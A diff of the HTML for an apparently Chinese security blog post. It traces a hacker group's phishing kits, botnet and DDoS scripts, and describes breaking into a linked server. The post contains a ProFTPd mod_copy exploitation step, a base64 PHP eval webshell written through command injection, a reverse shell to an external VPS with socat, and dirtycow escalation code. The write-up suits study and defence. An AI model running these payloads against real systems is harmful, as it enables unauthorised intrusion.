-    <img src="https://xeye.io/static/images/20200713181553.png" alt="2018-12-03 10-01-46屏幕截图.png-194kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181553.png" alt="2018-12-03 10-01-46屏幕截图.png-194kB" />
+</p>
 <p><strong>进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。</strong></p>
-<p><a href="https://xeye.io/static/images/20200713181614.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181614.png" alt="A111.png-160.3kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181633.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181633.png" alt="A22.png-9.2kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181727.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181727.png" alt="A33.png-88.2kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181743.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181743.png" alt="A44.png-62.1kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181817.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181817.png" alt="A55.png-56.5kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181614.png" alt="A111.png-160.3kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181633.png" alt="A22.png-9.2kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181727.png" alt="A33.png-88.2kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181743.png" alt="A44.png-62.1kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181817.png" alt="A55.png-56.5kB" />
+</p>
 <hr>
 <h3 id="45-提取日志"><strong>4.5 提取日志</strong></h3>
 <p>我提取了其中几个被入侵网站的访问日志。</p>
@@ -839,13 +803,11 @@ IP: 198.143.32.10 来自: 美国 Incapsula
 <h4 id="453-发现钓鱼程序"><strong>4.5.3 发现钓鱼程序</strong></h4>
 <p>网站　<code>zebramedia.al</code>　上发现多个攻击者放置的钓鱼程序和模板。</p>
 <p><strong>针对Dropbox</strong></p>
-<p><a href="https://xeye.io/static/images/20200713181830.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181830.png" alt="2018-12-01 00-32-03屏幕截图.png-116.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181830.png" alt="2018-12-01 00-32-03屏幕截图.png-116.9kB" />
+</p>
 <p><strong>针对Gmail</strong></p>
-<p><a href="https://xeye.io/static/images/20200713181852.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181852.png" alt="2018-12-01 00-28-51屏幕截图.png-76.2kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181852.png" alt="2018-12-01 00-28-51屏幕截图.png-76.2kB" />
+</p>
 <hr>
 <h3 id="46-关联分析"><strong>4.6 关联分析</strong></h3>
 <p>使用之前得到的后门文件中的关键字（<code>config.php</code>）对这3个网站文件进行匹配，发现其中2个存在相同后门文件，并且文件MD5值相同。</p>
@@ -875,71 +837,55 @@ e5c06f1f66781ba5c39d909096c4cd47  ./www.radiolanalhue.cl/www/public_html/online/
 </blockquote>
 <pre><code>nmap --script=firewalk --traceroute 187.85.134.4
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181905.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181905.png" alt="187.85.134.4-nmap.png-172.2kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181905.png" alt="187.85.134.4-nmap.png-172.2kB" />
+</p>
 <h3 id="5２-漏洞利用"><strong>5.２ 漏洞利用</strong></h3>
 <p>端口扫描发现目标 FTP Server为<code>ProFTPd 1.3.4a</code>，这个版本和<code>1.3.5</code>存在未授权文件复制漏洞，我们可以通过这个漏洞往Web目录写入一个WebShell。</p>
 <pre><code>ProFTPd 1.3.5 Remote Command Execution（CVE-2015-3306） 
 ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用，对系统文件进行任意复制。
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181916.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181916.png" alt="ProFTPd 1.3.5-a.png-84.8kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181916.png" alt="ProFTPd 1.3.5-a.png-84.8kB" />
+</p>
 <h3 id="5２-获取权限"><strong>5.２ 获取权限</strong></h3>
 <p>使用用MSF执行</p>
-<p><a href="https://xeye.io/static/images/20200713181928.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181928.png" alt="msf-proftpd_modcopy_exec.png-405kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181928.png" alt="msf-proftpd_modcopy_exec.png-405kB" />
+</p>
 <p>得到一个cmd功能的WebShell</p>
-<p><a href="https://xeye.io/static/images/20200713181944.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181944.png" alt="2018-12-03 21-50-12屏幕截图.png-190.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181944.png" alt="2018-12-03 21-50-12屏幕截图.png-190.9kB" />
+</p>
 <p>写入中国菜刀客户端</p>
 <pre><code>http://187.85.134.4/lndex.php?img=echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+Cg== |base64 -d  &gt;/var/www/index2.php
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181956.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181956.png" alt="2018-12-05 19-28-53屏幕截图.png-201.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181956.png" alt="2018-12-05 19-28-53屏幕截图.png-201.6kB" />
+</p>
 <h3 id="53-文件分析"><strong>5.3 文件分析</strong></h3>
 <p><strong>在Web目录下面发现用于发送钓鱼邮件的perl脚本、邮件钓鱼样本和大量的邮箱地址。以及挖矿后门、DDOS脚本等。</strong></p>
-<p><a href="https://xeye.io/static/images/20200713182008.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182008.png" alt="187.85.134.4-ls.png-473kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182026.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182026.png" alt="187.85.134.4-lsls.png-390.5kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182008.png" alt="187.85.134.4-ls.png-473kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182026.png" alt="187.85.134.4-lsls.png-390.5kB" />
+</p>
 <h4 id="531-钓鱼模板"><strong>5.3.1 钓鱼模板</strong></h4>
 <p>图示是针对丹麦丹斯克银行（Danske Bank）和希腊阿尔法银行（Alpha Bank）的邮件钓鱼样本。</p>
-<p><a href="https://xeye.io/static/images/20200713182037.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182037.png" alt="钓鱼模板1.png-50.5kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182047.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182047.png" alt="银行模板2.png-79.3kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182101.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182101.png" alt="银行模板3.png-37.5kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182127.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182127.png" alt="银行模板4.png-40.4kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182146.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182146.png" alt="银行模板5.png-24.7kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182207.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182207.png" alt="银行模板6.png-36.1kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182037.png" alt="钓鱼模板1.png-50.5kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182047.png" alt="银行模板2.png-79.3kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182101.png" alt="银行模板3.png-37.5kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182127.png" alt="银行模板4.png-40.4kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182146.png" alt="银行模板5.png-24.7kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182207.png" alt="银行模板6.png-36.1kB" />
+</p>
 <h4 id="532-僵尸网络程序"><strong>5.3.2 僵尸网络程序</strong></h4>
-<p><a href="https://xeye.io/static/images/20200713182233.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182233.png" alt="irc3.png-9.9kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713182217.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182217.png" alt="irc2.png-99.8kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182233.png" alt="irc3.png-9.9kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182217.png" alt="irc2.png-99.8kB" />
+</p>
 <h4 id="533-ddos脚本"><strong>5.3.3 DDOS脚本</strong></h4>
-<p><a href="https://xeye.io/static/images/20200713182242.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182242.png" alt="ddos2.png-75kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182242.png" alt="ddos2.png-75kB" />
+</p>
 <h4 id="534-邮箱地址"><strong>5.3.4 邮箱地址</strong></h4>
 <blockquote>
 <p>统计目录下的 txt 文本数量，发现共有六十二万四千个邮箱地址。</p>
@@ -1025,18 +971,16 @@ Ubuntu 12.04.2 LTS \n \l
 [/var/www/]$uname -an
 Linux medidor2 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013  GNU/Linux
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713182251.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182251.png" alt="3.5.0-23-a.png-104.5kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182251.png" alt="3.5.0-23-a.png-104.5kB" />
+</p>
 <pre><code>WebShell反弹：
 [/var/www/]$cd /var/tmp;./pty  xxx.xxx.xxx.xxx 443
 
 外网VPS监听：
 socat file:`tty`,echo=0,raw tcp-listen:443
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713182341.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182341.png" alt="2018-12-04 14-43-05屏幕截图.png-61.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182341.png" alt="2018-12-04 14-43-05屏幕截图.png-61.7kB" />
+</p>
 <p>实际测试<code>CVE-2013-2094，CVE-2013-1763</code>均无法提权。</p>
 <pre><code>CVE-2013-2094
 Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu
@@ -1051,9 +995,8 @@ Linux Kernel &lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local 
 <p>在本地环境提权测试过程中发现，i386架构下使用cowroot提权时EXP会破坏源文件，导致提权失败。而使用dirtycow-mem仅修改内存则没有问题，但是存在内核崩溃的风险。这两个EXP都是利用/proc/self/mem提权，前一个修改文件，后一个修改内存。</p>
 </blockquote>
 <p>如图所示：</p>
-<p><a href="https://xeye.io/static/images/20200713182349.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182349.png" alt="Screenshot-2019-1-23 Carbon.png-68.1kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182349.png" alt="Screenshot-2019-1-23 Carbon.png-68.1kB" />
+</p>
 <p>使用dirtycow-mem.c提权时需要注意：i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径，否则执行时找不到文件。</p>
 <pre><code>#define SHELLCODE	&quot;\x31\xc0\xc3&quot;
 #define SPACE_SIZE	256
@@ -1317,17 +1260,14 @@ file.close()
 </code></pre>
 <h4 id="563-生成热力图"><strong>5.6.3 生成热力图</strong></h4>
 <p>如图所示，欧洲IP居多，亚洲也不少。至于有多少主机沦陷和多少受害者上钩，无法准确判断。</p>
-<p><a href="https://xeye.io/static/images/20200713182405.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182405.png" alt="热力图１.png-526.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182405.png" alt="热力图１.png-526.6kB" />
+</p>
 <hr>
-<p><a href="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" target="_blank">
-    <img src="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" alt="热力图2.png-357.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://camo.githubusercontent.com/c01cd78bd57faa9ade3be5232fd61326eafb3a25/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f79636673376c3066366371686d393672306f6636656570312f254537253833254144254535253841253942254535253942254245322e706e67" alt="热力图2.png-357.6kB" />
+</p>
 <hr>
-<p><a href="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" target="_blank">
-    <img src="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" alt="热力图3.png-1196.3kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://camo.githubusercontent.com/15cd9e86590c6db60de17e0ee9cb13f996894054/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3374717a303672756c78337933767466336265306d3738332f254537253833254144254535253841253942254535253942254245332e706e67" alt="热力图3.png-1196.3kB" />
+</p>
 <hr>
 <h2 id="六信息汇总">六、信息汇总</h2>
 <p>根据所得信息汇总，对这个黑客组织信息进行简单分析，仅供参考。</p>
@@ -1448,10 +1388,8 @@ webcam.wm-itservice.at
 <hr>
 <h2 id="七攻击路径还原">七、攻击路径还原</h2>
 <p>复盘整个溯源过程，还原攻击者攻击路径。</p>
-<p><a href="https://xeye.io/static/images/20200713182417.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713182417.png" alt="攻击路径１ (4).png-215.2kB" />
-</a></p>
-
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713182417.png" alt="攻击路径１ (4).png-215.2kB" />
+</p>
     </div>
 </article>
 
@@ -1467,6 +1405,71 @@ webcam.wm-itservice.at
 
             </div>
             <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">主页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">搜索</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/%E7%BA%A2%E9%98%9F%E7%A0%94%E7%A9%B6/">红队研究</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%98%85%E8%AF%BB/">阅读</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
     
     
     
@@ -1526,60 +1529,6 @@ webcam.wm-itservice.at
     </div>
     
     
-    
-    <div class="sidebar-item sidebar-pages">
-        <h3>Pages</h3>
-        <ul>
-            
-            <li>
-                <a href="/">主页</a>
-            </li>
-            
-            <li>
-                <a href="/archives/">归档</a>
-            </li>
-            
-            <li>
-                <a href="/about/">关于</a>
-            </li>
-            
-            <li>
-                <a href="/search/">搜索</a>
-            </li>
-            
-            <li>
-                <a href="/index.xml">RSS</a>
-            </li>
-            
-        </ul>
-    </div>
-    
-    <div class="sidebar-item sidebar-tags">
-        <h3>Tags</h3>
-        <div>
-            
-        </div>
-    </div>
-    
-    <div class="sidebar-item sidebar-links">
-        <h3>Links</h3>
-        <ul>
-            
-            <li>
-                <a href="https://github.com/" target="_blank"><span>GitHub</span></a>
-            </li>
-            
-            <li>
-                <a href="https://twitter.com/" target="_blank"><span>Twitter</span></a>
-            </li>
-            
-            <li>
-                <a href="https://space.bilibili.com/" target="_blank"><span>bilibili</span></a>
-            </li>
-            
-        </ul>
-    </div>
-    
 </aside>
         </div>
         <div class="btn">
@@ -1603,12 +1552,10 @@ webcam.wm-itservice.at
     </div>
 </footer>
     
-    <script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
-<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
-
+    
+<script defer src="https://cdn.jsdelivr.net/combine/npm/medium-zoom@1.0.5,npm/lazysizes@5.2.2"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/components/prism-core.min.js"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/plugins/autoloader/prism-autoloader.min.js"></script>
-<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script>
 
 <script defer src="/assets/js/fuji.min.js"></script>
 
